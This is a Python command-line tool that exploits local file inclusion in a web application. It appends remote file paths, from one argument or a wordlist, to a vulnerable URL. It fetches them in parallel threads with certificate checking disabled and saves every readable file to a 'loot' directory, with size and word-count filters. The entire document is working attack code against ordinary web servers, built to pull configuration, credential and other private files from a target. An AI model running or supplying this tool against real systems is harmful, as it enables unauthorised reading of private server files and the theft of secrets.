#!/usr/bin/python3

import argparse
import concurrent.futures
import os
import requests
import threading
import warnings
from bs4 import BeautifulSoup
from rich.progress import track
from urllib.parse import urlparse
import urllib3


def parse_args():
    parser = argparse.ArgumentParser(description='Description message')
    parser.add_argument(
        '-v',
        '--verbose',
        action='store_true',
        default=False,
        help='Verbose mode. Print both successful and failed attempts.',
    )
    parser.add_argument(
        '-u',
        '--url',
        type=str,
        required=True,
        help='URL to connect to. (example: http://localhost/?page=LFIPATH)',
    )
    files_source = parser.add_mutually_exclusive_group(required=True)
    files_source.add_argument('-f', '--file', type=str, help='Remote file to read.')
    files_source.add_argument(
        '-F',
        '--filelist',
        type=str,
        help='File containing a list of paths to files to read remotely.',
    )
    parser.add_argument(
        '-o',
        '--output',
        type=str,
        default='./loot/',
        help='Directory where the dumped files will be stored.',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=10,
        help='Number of threads to use. (default: 10)',
    )
    parser.add_argument(
        '-fs',
        '--filter-size',
        type=float,
        default=0,
        help='Filter results based on the amount of bytes.',
    )
    parser.add_argument(
        '-fw',
        '--filter-words',
        type=int,
        default=0,
        help='Filter results based on the amount of words.',
    )
    return parser.parse_args()


def validate_url(url):
    parsed_url = urlparse(url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError('Invalid URL format. Please provide a valid URL.')

    try:
        response = requests.get(url)
        response.raise_for_status() 
    except requests.exceptions.RequestException as e:
        raise ValueError(
            f'\x1b[91m (==error==) Failed to connect to the URL: {url} \x1b[0m'
        )


def disable_warnings():
    warnings.filterwarnings(
        'ignore', category=urllib3.exceptions.InsecureRequestWarning
    )


def get_content(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, features='html.parser')
        for script in soup(['script', 'style']):
            script.clear()
        text = soup.get_text()
        return text
    except requests.exceptions.RequestException as e:
        print(e)
        return None


def remote_lfi(filepath, url):
    data = {'path': filepath, 'success': False, 'content': ''}
    r = requests.get(url + filepath, verify=False)
    filecontent = r.content
    data['success'] = bool(r.status_code == 200) and bool(len(filecontent) != 0)
    if data['success']:
        data['content'] = filecontent
    return data


def b_filesize(file):
    l = len(file['content'])
    return f'{l} B'


def dump_successful_file(file, output_dir):
    file_path = os.path.join(output_dir, file['path'])
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, 'wb') as f:
        f.write(file['content'])
    print(
        f'\x1b[94m[+] ({b_filesize(file)} | {len(file["content"].split())} Words) {file["path"]}\x1b[0m'
    )


def dump_failed_file(filepath, verbose):
    if verbose:
        print(f'\x1b[91m[!] (==error==) {filepath}\x1b[0m')


def dump_file(output_dir, filepath, url, verbose=False, filter_words=0, filter_size=0):
    file = remote_lfi(filepath, url)
    if file['success']:
        if filter_size and len(file['content']) == filter_size:
            return False
        if filter_words and len(file['content'].split()) == filter_words:
            return False

        dump_successful_file(file, output_dir)
        return True
    else:
        return dump_failed_file(filepath, verbose)


def load_wordlist(filelist):
    with open(filelist, 'r') as f:
        return [l.strip().lstrip('/') for l in f.readlines() if len(l.strip()) != 0]


def main():
    args = parse_args()
    validate_url(args.url)
    disable_warnings()

    output_dir = args.output
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    try:
        if args.file:
            dump_file(
                output_dir,
                args.file,
                args.url,
                args.verbose,
                args.filter_words,
                args.filter_size,
            )
        else:
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=args.threads
            ) as executor:
                files = load_wordlist(args.filelist)
                tasks = [
                    executor.submit(
                        dump_file,
                        output_dir,
                        file,
                        args.url,
                        args.verbose,
                        args.filter_words,
                        args.filter_size,
                    )
                    for file in files
                ]
                for task in track(
                    concurrent.futures.as_completed(tasks),
                    description='Reading remote files',
                    total=len(tasks),
                ):
                    pass
    except KeyboardInterrupt:
        print('\nProgram interrupted by the user. Exiting...')


if __name__ == '__main__':
    main()
